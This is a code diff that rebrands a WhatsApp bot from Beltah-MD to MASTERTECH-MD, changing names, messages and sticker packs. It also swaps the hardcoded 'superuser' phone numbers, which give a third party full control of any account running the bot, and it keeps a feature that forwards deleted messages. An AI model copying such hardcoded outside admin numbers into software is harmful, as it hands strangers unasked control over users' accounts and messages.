@@ -486,12 +486,12 @@ if (conf.AUTO_REACT_STATUS === "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '254114141192';
-            const dj2 = '254737681758';
-            const dj3 = "254748851027";
-            const luffy = '254114141192';
+            const dj = '254743727510';
+            const dj2 = '254743727510';
+            const dj3 = "254743727510";
+            const luffy = '254743727510';
             const sudo = await getAllSudoNumbers();
-            let goat = "254114141192";
+            let goat = "254743727510";
             const superUserNumbers = [servBot, goat, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
@@ -581,7 +581,7 @@ function mybotpic() {
             
             };
                  
-// BELTAH MD DID EVERYTHING ,,,DO NOT COPY ...
+// MASTERTECH MD DID EVERYTHING ,,,DO NOT COPY ...
 if (!superUser && origineMessage  === auteurMessage && conf.AUTO_REACT === "yes") {
 const emojis = ['👣', '🏗️', '✈️', '🌽', '🏸', '🛖', '🍁', '🛰️', '🥔', '🎡', '🎸', '🎼', '🔉', '📿', '🪇', '📹', '🎞️', '🪔', '📔', '🏷️', '💰', '📥', '🗳️', '📭', '🖌️', '📏', '', '🪛', '🔨', '⛓️‍💥', '📌', '🗝️', '🔍', '🥁', '🔊', '🥾', '👢', '🩰', '👡', '🙂', '🎊', '🎉', '🎁', '⛑️', '👋']
          const emokis = emojis[Math.floor(Math.random() * (emojis.length))]
@@ -792,7 +792,7 @@ if (conf.ANTILINK === "yes") {
         
                                     if(msg === null || !msg ||msg === 'undefined') {console.log('Message not found') ; return } 
         
-                                await zk.sendMessage(idBot,{ image : { url : './media/deleted-message.jpg'},caption : `      𝐁𝐄𝐋𝐓𝐀𝐇-𝐌𝐃 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 \n Message from @${msg.key.participant.split('@')[0]}​\n 𝐓𝐇𝐄 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐈𝐒 𝐇𝐄𝐑𝐄 👇` , mentions : [msg.key.participant]},)
+                                await zk.sendMessage(idBot,{ image : { url : './media/deleted-message.jpg'},caption : `      MASTERTECHELITE-MD 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 \n Message from @${msg.key.participant.split('@')[0]}​\n 𝐓𝐇𝐄 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐈𝐒 𝐇𝐄𝐑𝐄 👇` , mentions : [msg.key.participant]},)
                                 .then( () => {
                                     zk.sendMessage(idBot,{forward : msg},{quoted : msg}) ;
                                 })
@@ -935,7 +935,7 @@ if (conf.ANTILINK === "yes") {
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Beltah-Md',
+                                        pack: 'MASTERTECH-MD',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -1033,7 +1033,7 @@ if (conf.ANTILINK === "yes") {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Beltah-Md',
+                pack: 'ELITE-MD',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -1350,17 +1350,17 @@ zk.ev.on('group-participants.update', async (group) => {
                 else {
                     md = "undefined";
                 }
-                console.log("Beltah md successfully connected✅");
+                console.log("MASTERTECH-MD successfully connected ✅🥳");
 
                 await activateCrons();
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
-                let cmsg = `ʙᴇʟᴛᴀʜ xʙᴏᴛ ɪs ᴄᴏɴɴᴇᴄᴛᴇᴅ
+                let cmsg = `mastertech-md ʙᴏᴛ ɪs ᴄᴏɴɴᴇᴄᴛᴇᴅ
 
 ᴍᴏᴅᴇ :${md}
 ᴘʀᴇғɪx : [ ${prefixe} ]
 ᴘʟᴜɢɪɴs :456
-ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴍᴜsᴛᴀғғᴀ ᴛᴇᴄʜ 👻
+ᴅᴇᴠᴇʟᴏᴘᴇʀ : mastertech-md 👻
 
 ᴡᴀᴛᴄʜ ᴀʟʟ ᴛᴜᴛᴏʀɪᴀʟs
 youtube.com/@ᴘᴏᴘᴋɪᴅ2024`;
